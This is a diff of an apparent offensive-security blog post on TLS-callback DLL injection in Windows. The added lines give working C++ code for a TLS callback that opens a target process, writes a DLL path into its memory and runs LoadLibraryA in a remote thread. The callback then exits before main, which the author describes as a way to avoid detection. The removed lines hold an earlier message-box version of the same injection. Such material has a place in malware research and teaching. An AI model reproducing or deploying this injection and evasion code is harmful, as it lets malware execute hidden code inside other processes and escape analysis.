@@ -182,7 +182,9 @@ I want you to keep that in mind.
 
 In our case, the ```.CRT$XLB``` section is used for TLS callbacks. Functions in this section are called by the Windows loader when a new thread starts or exits in the process, before any user code is run. These are typically used for thread initialization purposes.
 
-Now the rest of the line has a purpose to define the Callback ```TLS callback PIMAGE_TLS_CALLBACK pTLSCallback = TlsCallback;```
+Now the rest of the line has a purpose to define the Callback ```TLS callback PIMAGE_TLS_CALLBACK pTLSCallback = TlsCallback;```.
+This assigns the TLS callback function TlsCallback to the variable pTLSCallback. This means the function TlsCallback will be called automatically by the system whenever a thread is created or destroyed.
+
 This is a typedef for a pointer to a function that serves as a TLS callback :
 
 ```cpp
@@ -192,88 +194,74 @@ typedef VOID (NTAPI *PIMAGE_TLS_CALLBACK)(
     PVOID Reserved
 );
 ```
+
 - **Injection**
 
+So now we can start writing our Callback function to trigger the DLL Injection.
 ```cpp
-int injection(HANDLE handle_proc) {
-    // Define the message box parameters
-    const wchar_t *message = L"You've been hacked by sn4keEy3s";
-    const wchar_t *title = L"TLS Injection";
-    UINT uType = MB_OK;
+void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved)
+{
+    int pid = 4288;
+    HANDLE handle_proc = NULL;
 
-    // Allocate memory in the target process for the MessageBoxW parameters
-    SIZE_T message_len = (wcslen(message) + 1) * sizeof(wchar_t);
-    SIZE_T title_len = (wcslen(title) + 1) * sizeof(wchar_t);
+    if (pid) {
+        handle_proc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+                                  PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+                                  FALSE, (DWORD)pid);
 
-    // Allocate memory in the target process
-    LPVOID pMessage = VirtualAllocEx(handle_proc, NULL, message_len, MEM_COMMIT, PAGE_READWRITE);
-    LPVOID pTitle = VirtualAllocEx(handle_proc, NULL, title_len, MEM_COMMIT, PAGE_READWRITE);
-
-    if (pMessage == NULL || pTitle == NULL) {
-        return -1;
+        if (handle_proc != NULL) {
+            injection(handle_proc);
+            CloseHandle(handle_proc);
+        }
     }
 
-    // Write the parameters to the allocated memory
-    WriteProcessMemory(handle_proc, pMessage, message, message_len, NULL);
-    WriteProcessMemory(handle_proc, pTitle, title, title_len, NULL);
+    ExitProcess(0);
+}
+```
+So as you see it's a simple caller to the function injection that will serve the DLL Injection, BUUUT Note the ```ExitProcess``` at the end, so from here we can conclude that the main function will never be executed. This is good for avoiding detection huh? while  a malware analyst is always start debugging from the entry point HAHA, Just kidding.
 
-    // Get the address of MessageBoxW from user32.dll
-    HMODULE hUser32 = GetModuleHandle(L"user32.dll");
-    FARPROC pMessageBoxW = GetProcAddress(hUser32, "MessageBoxW");
-
-    if (pMessageBoxW == NULL) {
-        VirtualFreeEx(handle_proc, pMessage, 0, MEM_RELEASE);
-        VirtualFreeEx(handle_proc, pTitle, 0, MEM_RELEASE);
-        return -1;
+Passing now to the Injection function which we cover it in the first blog of these series. 
+```cpp
+int injection(HANDLE hProcess) {
+    const char* dllPath="C:\\Users\\agoum\\Downloads\\TLSInjection\\InjectedDLL.dll";
+    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!pRemoteMemory) {
+        CloseHandle(hProcess);
+        return 0;
     }
 
-    // Create a remote thread in the target process that calls MessageBoxW
-    HANDLE hThread = CreateRemoteThread(handle_proc, NULL, 0, (LPTHREAD_START_ROUTINE)pMessageBoxW,
-                                        pMessage, 0, NULL);
-
-    if (hThread == NULL) {
-        VirtualFreeEx(handle_proc, pMessage, 0, MEM_RELEASE);
-        VirtualFreeEx(handle_proc, pTitle, 0, MEM_RELEASE);
-        return -1;
+    // Write the DLL path to the allocated memory
+    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
+        std::cerr << "WriteProcessMemory failed!" << std::endl;
+        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return 0;
     }
 
-    // Wait for the thread to finish
+    // Get the address of LoadLibraryA
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    LPTHREAD_START_ROUTINE pLoadLibraryA = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
+
+    // Create a remote thread that calls LoadLibraryA
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteMemory, 0, NULL);
+    if (!hThread) {
+        std::cerr << "CreateRemoteThread failed!" << std::endl;
+        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return 0;
+    }
+    MessageBoxW(NULL, L"Thread created", L"TLS injection", 0);
+
+    // Wait for the remote thread to complete
     WaitForSingleObject(hThread, INFINITE);
 
     // Clean up
+    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
     CloseHandle(hThread);
-    VirtualFreeEx(handle_proc, pMessage, 0, MEM_RELEASE);
-    VirtualFreeEx(handle_proc, pTitle, 0, MEM_RELEASE);
+    CloseHandle(hProcess);
 
     return 0;
 }
 ```
-
-So the Injection function takes as arguments the pid of the target process and as usuall we allocate space in the target memory space to write our malicious content, in our case we will trigger a message box.
-
-After that we defined our Injection function, lets set it in a Callback function to be executed. it simply fire up the injector.
-```
-void NTAPI __stdcall TLSCallbacks(PVOID DllHandle, DWORD dwReason, PVOID Reserved)
-{
-	int pid = NULL;
-    HANDLE handle_proc = NULL;
-	
-
-	if (pid) {
-		MessageBoxW(NULL, L"Notepad Found", L"TLS injection", 0);
-		handle_proc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
-						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
-						FALSE, (DWORD) pid);
-
-	if (handle_proc != NULL) {
-		
-		injection(handle_proc);
-		CloseHandle(handle_proc);
-		}
-	}
-
-	ExitProcess(0);
-}
-
 
 
